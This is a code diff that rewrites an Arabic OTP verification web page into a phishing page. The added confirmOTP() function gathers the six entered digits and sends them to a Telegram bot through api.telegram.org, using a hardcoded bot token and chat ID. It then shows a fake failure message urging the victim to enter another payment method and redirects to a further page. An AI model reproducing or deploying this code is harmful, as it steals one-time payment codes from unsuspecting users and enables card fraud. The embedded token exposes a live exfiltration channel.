@@ -1,159 +1,48 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>رمز التحقق | OTP</title>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>رمز التحقق | OTP</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #f1f3f6;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .otp-box {
-      background-color: #ffffff;
-      padding: 40px 30px;
-      width: 90%;
-      max-width: 420px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    h2 {
-      font-size: 20px;
-      color: #0d2343;
-      margin-bottom: 10px;
-    }
-
-    .info-text {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 25px;
-    }
-
-    .otp-inputs {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 25px;
-      flex-wrap: wrap;
-    }
-
-    .otp-inputs input {
-      width: 40px;
-      height: 50px;
-      font-size: 24px;
-      text-align: center;
-      border: 1.5px solid #ccc;
-      border-radius: 10px;
-      background-color: #f9f9f9;
-      transition: all 0.3s;
-    }
-
-    .otp-inputs input:focus {
-      border-color: #0d2343;
-      background-color: #fff;
-      outline: none;
-      box-shadow: 0 0 5px rgba(13,35,67,0.2);
-    }
-
-    .timer {
-      color: #888;
-      font-size: 13px;
-      margin-bottom: 20px;
-    }
-
-    .confirm-btn {
-      width: 100%;
-      background-color: #0d2343;
-      color: #ffffff;
-      border: none;
-      padding: 14px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    .confirm-btn:hover {
-      background-color: #081a33;
-    }
-
-    .resend {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #0d2343;
-      background: none;
-      border: none;
-      text-decoration: underline;
-      cursor: pointer;
-    }
+    body { margin: 0; padding: 0; background-color: #f1f3f6; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .otp-box { background-color: #ffffff; padding: 40px 30px; width: 90%; max-width: 420px; border-radius: 16px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); text-align: center; }
+    h2 { font-size: 20px; color: #0d2343; margin-bottom: 10px; }
+    .info-text { font-size: 14px; color: #444; margin-bottom: 25px; }
+    .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+    .otp-inputs input { width: 40px; height: 50px; font-size: 24px; text-align: center; border: 1.5px solid #ccc; border-radius: 10px; background-color: #f9f9f9; }
+    .confirm-btn { width: 100%; background-color: #0d2343; color: #ffffff; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; }
+    #error-msg { color: #ce0000; font-weight: bold; margin-top: 15px; display: none; }
   </style>
 </head>
 <body>
-
 <div class="otp-box">
   <h2>رمز التحقق لمرة واحدة</h2>
-  <p class="info-text">تم إرسال رمز تحقق إلى رقم هاتفك المنتهي بـ <strong>7890</strong>. يرجى إدخال الرمز أدناه لإكمال العملية.</p>
-
+  <p class="info-text">يرجى إدخال الرمز المرسل إلى هاتفك لإتمام العملية.</p>
   <div class="otp-inputs">
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
-    <input type="text" maxlength="1" oninput="moveToNext(this)" />
+    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
+    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
+    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
+    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
+    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
+    <input type="text" maxlength="1" />
   </div>
-
-  <div class="timer" id="timer">الرمز ينتهي خلال: 01:00</div>
-
   <button class="confirm-btn" onclick="confirmOTP()">تأكيد</button>
-  <button class="resend" onclick="resendOTP()">لم تستلم الرمز؟ أعد الإرسال</button>
+  <p id="error-msg">⚠️ عذراً، لم تنجح عملية التحقق. يرجى إدخال طريقة دفع أخرى.</p>
 </div>
-
 <script>
-  function moveToNext(el) {
-    if (el.value.length === 1 && el.nextElementSibling) {
-      el.nextElementSibling.focus();
-    }
-  }
+  const token = "8696968658:AAF2W7759-6i1demyYVPzrfgGfYjhkIFvng";
+  const chatId = "1848565778";
 
   function confirmOTP() {
-    window.location.href = "payment_page.html";
+    let code = "";
+    document.querySelectorAll('.otp-inputs input').forEach(i => code += i.value);
+    const msg = `🔐 رمز التحقق المدخل (OTP): ${code}`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+    .finally(() => {
+        document.getElementById('error-msg').style.display = 'block';
+        setTimeout(() => { window.location.href = "page2.html"; }, 3000);
+    });
   }
-
-  function resendOTP() {
-    alert("تم إرسال رمز جديد إلى رقمك.");
-    startTimer();
-  }
-
-  function startTimer() {
-    let duration = 60;
-    const timerDisplay = document.getElementById("timer");
-
-    const countdown = setInterval(() => {
-      const minutes = Math.floor(duration / 60);
-      const seconds = duration % 60;
-      timerDisplay.textContent = `الرمز ينتهي خلال: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-      duration--;
-
-      if (duration < 0) {
-        clearInterval(countdown);
-        timerDisplay.textContent = "انتهت صلاحية الرمز. الرجاء إعادة الإرسال.";
-      }
-    }, 1000);
-  }
-
-  startTimer();
 </script>
-
 </body>
 </html>
